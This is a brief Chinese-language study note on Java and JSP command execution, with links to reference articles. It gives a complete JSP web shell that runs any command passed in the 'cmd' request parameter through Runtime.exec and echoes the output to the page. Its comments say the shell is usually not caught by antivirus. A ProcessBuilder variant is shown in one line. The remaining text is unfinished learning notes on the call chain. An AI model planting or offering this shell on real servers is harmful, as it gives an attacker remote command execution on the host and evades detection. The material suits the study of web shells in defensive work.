**必读**

读到 `反射UNIXProcess/ProcessImpl执行本地命令` 前

https://javasec.org/javase/CommandExecution/

读完:

https://xz.aliyun.com/t/9488#toc-0

---



### jsp基本回显和消除乱码

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    Runtime rt = Runtime.getRuntime();
    String cmd = request.getParameter("cmd");
    Process process = rt.exec(cmd);

    // 总而言之拼接为： Runtime.getRuntime().exec(request.getParameter("cmd")); 

	//把结果流处理一下
    java.io.InputStream in = process.getInputStream();

    // 回显，基本不用动，一般不杀
    out.print("<pre>");
    // 网上流传的回显代码略有问题，建议采用这种方式
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
```



### [Runtime命令执行调用链](https://javasec.org/javase/CommandExecution/#runtime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%B0%83%E7%94%A8%E9%93%BE)

（暂时不懂）

切记`Runtime`和`ProcessBuilder`并不是程序的最终执行点!



最常用的:

```java
Runtime.getRuntime().exec();
```

`ProcessBuilder` 命令执行(关键代码)

```jsp
 InputStream in = new ProcessBuilder(request.getParameterValues("cmd")).start().getInputStream();
```

`UNIXProcess/ProcessImpl` 命令执行

(

JDK9的时候合并到了`ProcessImpl`,本质上还是利用了命令执行调用链**(参照[Runtime命令执行调用链])**

)

